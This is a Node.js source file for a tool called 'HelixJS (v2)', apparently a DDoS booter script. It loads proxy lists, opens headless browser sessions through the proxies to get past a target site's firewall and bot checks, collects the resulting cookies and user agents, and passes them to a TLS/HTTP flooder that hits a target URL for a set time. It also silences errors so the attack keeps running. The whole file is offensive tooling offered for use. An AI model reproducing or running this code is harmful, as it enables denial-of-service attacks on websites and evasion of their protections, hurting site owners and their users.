/*

** @ImComplex **

*/

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
(ignoreNames = [
  "RequestError",
  "StatusCodeError",
  "CaptchaError",
  "CloudflareError",
  "ParseError",
  "ParserError",
]),
  (ignoreCodes = [
    "ECONNRESET",
    "ERR_ASSERTION",
    "ECONNREFUSED",
    "EPIPE",
    "EHOSTUNREACH",
    "ETIMEDOUT",
    "ESOCKETTIMEDOUT",
    "EPROTO",
  ]);

process
  .on("uncaughtException", function (e) {
    if (
      (e.code && ignoreCodes.includes(e.code)) ||
      (e.name && ignoreNames.includes(e.name))
    )
      return false;
    console.warn(e);
  })
  .on("unhandledRejection", function (e) {
    if (
      (e.code && ignoreCodes.includes(e.code)) ||
      (e.name && ignoreNames.includes(e.name))
    )
      return false;
    console.warn(e);
  })
  .on("warning", (e) => {
    if (
      (e.code && ignoreCodes.includes(e.code)) ||
      (e.name && ignoreNames.includes(e.name))
    )
      return false;
    console.warn(e);
  })
  .on("SIGHUP", () => {
    return 1;
  })
  .on("SIGCHILD", () => {
    return 1;
  });

const request = require("request");
const { exec } = require("child_process");
const colors = require("colors");
const url = require("url");
const syncRequest = require("sync-request");
var CustomsARGVS = require("minimist")(process.argv.slice(2));
const fs = require("fs");
let target = process.argv[2].split('""')[0];
const time = process.argv[3];
var parsed = url.parse(target);
var host = url.parse(target).host;

let length_browsers = 70;
let browser_saves = "";
let user_agent = "";
let ModeATTACK = CustomsARGVS.mode;
let PostaMOD = undefined;
let rff = undefined;
let cookie_CTM = undefined;
let connections = CustomsARGVS.conn;
let ListIDS = [];
let Idbrw = 0;
let idsRunned = [];
if (CustomsARGVS.postdata) {
  if (CustomsARGVS.postdata.includes("~")) {
    CustomsARGVS.postdata = CustomsARGVS.postdata.replace(/~/g, "&");
  }
  if (CustomsARGVS.postdata.includes("*")) {
    CustomsARGVS.postdata = CustomsARGVS.postdata.replace(/\*/g, "%");
  }
}
if (CustomsARGVS.customCookie) {
  if (CustomsARGVS.customCookie.includes("~")) {
    CustomsARGVS.customCookie = CustomsARGVS.customCookie.replace(/~/g, ";");
  }
}
if (target.includes("*")) {
  target = target.replace(/\*/g, "%");
}

let typeAlert = 2;
let PROMOTION = "Booter.sx got fucking rekt";

//proxy selection
var PROXYURL = `http://yourproxies/premium1.txt`;
var VarsDefinetions = {
  Objetive: target,
  VersionsHTTP: ["HTTP/1.1", "HTTP/1.2", "HTTP/1.3"],
  req_ip: process.argv[4] || 32,
  Method_raw: process.argv[5] || "GET",
  time: process.argv[3],
};

function add_uss(user) {
  // if (user_agent.includes("Mozilla/5.0") == false) {
  user_agent = user;
  // } else {
  // }
}

function log(string) {
  let d = new Date();

  let hours = (d.getHours() < 10 ? "0" : "") + d.getHours();
  let minutes = (d.getMinutes() < 10 ? "0" : "") + d.getMinutes();
  let seconds = (d.getSeconds() < 10 ? "0" : "") + d.getSeconds();

  console.log(`[${hours}:${minutes}:${seconds}] ${string}`);
}

log(`HelixJS (v2) ` + `[ ${PROMOTION} ]`);
log(`Loading proxies..`);

try {
  if (PROXYURL.indexOf("//") & PROXYURL.indexOf(".")) {
    var res = syncRequest("GET", PROXYURL, {
      headers: {
        "user-agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0",
      },
    });

    ProxyFILE = res.getBody("utf8").replace(/\r/g, "").split("\n");
  }
} catch (error) {
  ProxyFILE = fs.readFileSync("proxy.txt").toString().match(/\S+/g);
}
const proxies_total = ProxyFILE.length - 2;
//const ProxyFILE = set.match(/(\d{1,3}\.){3}\d{1,3}\:\d{1,5}/g);
log(`Loaded ${proxies_total + 2}`);

function ProxyGenerate() {
  return (proxy_obje = ProxyFILE[~~[Math.random() * proxies_total]]);
}

function brow_tokens(strings, proxy_co, ua_received) {
  if (
    browser_saves == null &&
    browser_saves == undefined &&
    browser_saves == ""
  ) {
    browser_saves +=
      "" + proxy_co + "#" + strings + "#" + ua_received + "" + ":::";
  } else {
    browser_saves +=
      "" + proxy_co + "#" + strings + "#" + ua_received + "" + ":::";
  }
}

var launch_browser = async function launch_browser(Extra = {}) {
  Idbrw++;
  let RunSessions = require("./browser/browserEngine.js");
  let IdBrowser = Extra.IdBrowser;
  const Proxy = Extra.Proxy;
  const intentNum = Extra.intentNum;
  const ProxyReopen = ProxyGenerate();

  const resposense = await RunSessions.RunSessions({
    IdBrowser: IdBrowser,
    Proxy: Proxy,
    Domain: VarsDefinetions.Objetive,
  });

  if (resposense == undefined) {
    log(
      "[error] [" +
        IdBrowser +
        "]" +
        ` Unknown error occured while trying to bypass firewall with ip: ${Proxy}`
          
    );
    ListIDS.push(IdBrowser);
    return;
  } else if (resposense == "error") {
    log(
      "[error] [" +
        IdBrowser +
        "]" +
        ` Error while trying to bypass firewall with ip: ${Proxy}`
    );
    ListIDS.push(IdBrowser);
    return;
  } else {
    if (typeAlert == 1) {
      log(`Browsers received (${browser_saves.split("#").length})`);
    } else if (typeAlert == 2) {
      log(
        `[info]` +
          ` Successfully bypassed firewall with ip: ${Proxy} | Cookies: ${
            resposense[IdBrowser].split(":::")[0]
          }`
      );
    } else {
      log("Invalid alert type.");
      return process.exit();
    }

    await setFlooder(
      Proxy,
      resposense[IdBrowser].split(":::")[0],
      resposense[IdBrowser].split(":::")[1]
    );
    ListIDS.push(IdBrowser);
  }
};

if (ModeATTACK == "browser") {
  log(`Mode: ` + `${ModeATTACK.toUpperCase()}`);
  log(`Total browsers to open: ` + `${length_browsers}`);
  log(`method: ` + `${VarsDefinetions.Method_raw}`);
  log(`postdata: ` + `${CustomsARGVS.postdata || "false"}`);
  log(`cookie: ` + `${CustomsARGVS.customCookie || "false"}`);
  log(`referer: ` + `${CustomsARGVS.referer || "false"}`);
  log(`Launching browsers on: ` + `${target}`);
  let NumOPenBrowser = 10;
  var myInterval = setInterval(function () {
    //idsRunned: lista de ids ya lanzados
    if (ListIDS.length >= length_browsers) {
      //KillBrowsers();
      clearInterval(myInterval);
      log(`[success]` + ` Attcak proccess finished, idle set.`);
    } else if (ListIDS.length == idsRunned.length) {
      for (let j = 0; j < NumOPenBrowser; j++) {
        const Proxy = ProxyGenerate();
        idsRunned.push(Idbrw);
        launch_browser({ IdBrowser: Idbrw, Proxy: Proxy, intentNum: 0 });
      }

      log(`[info] Starting interval`);
    } else if (
      ListIDS.length == length_browsers &&
      ListIDS.length < (50 / 100) * length_browsers
    ) {
      log(`[success] Cookies recolected!`);
    }
  }, 0);
} else if (ModeATTACK == "tls") {
  log(`[info] Mode: ${ModeATTACK}`);
  log(`Target: ${target}`);
  require("./browser/flooder").TLSHTTP(
    (option = {
      target: VarsDefinetions.Objetive,
      host: host,
      RequestIP: VarsDefinetions.req_ip,
      proxies: ProxyFILE,
    })
  );
  log(`[info] Flooder started`);
} else {
  console.clear();
  log('Invalid mode selected, valid modes: tls, browser');
  process.exit();
}

function setFlooder(ip, cookie, ua) {
  //clearInterval(myInterval);

  if (CustomsARGVS.postdata) {
    PostaMOD = encodeURI(CustomsARGVS.postdata);
  }

  try {
    if (
      (CustomsARGVS.referer.includes("//") == true) &
        (CustomsARGVS.referer.includes(".") == true) &&
      CustomsARGVS.referer.includes("//") == true
    ) {
      rff = CustomsARGVS.referer;
    }
  } catch (error) {
    rff = target;
  }

  try {
    if (CustomsARGVS.customCookie.includes("=") == true) {
      cookie_CTM = ";" + CustomsARGVS.customCookie;
    }
  } catch (error) {
    cookie_CTM = ""; //null
  }

  require("./browser/flooder.js").flooderTLS(
    (option = {
      //DATABROWSER: browser_saves,
      ip: ip,
      cookie: cookie,
      ua: ua,
      host: host,
      rff: rff,
      target: VarsDefinetions.Objetive,
      RequestIP: VarsDefinetions.req_ip,
      userAgent: user_agent,
      addcookie: cookie_CTM,
      TimeATTACK: VarsDefinetions.time,
      METHOD: VarsDefinetions.Method_raw,
      PostData: PostaMOD || undefined,
      connections: connections || 32,
    })
  );

  //log(`[info] Flooder started with ${(browser_saves.split("#").length - 1) / 2} tokens`);
  log(`[info]` + ` Flooder started with ${ip}`);
}

setTimeout(() => {
  console.clear();
  log(`Attacks Finished.`);
  process.exit(1);
}, VarsDefinetions.time * 1000);
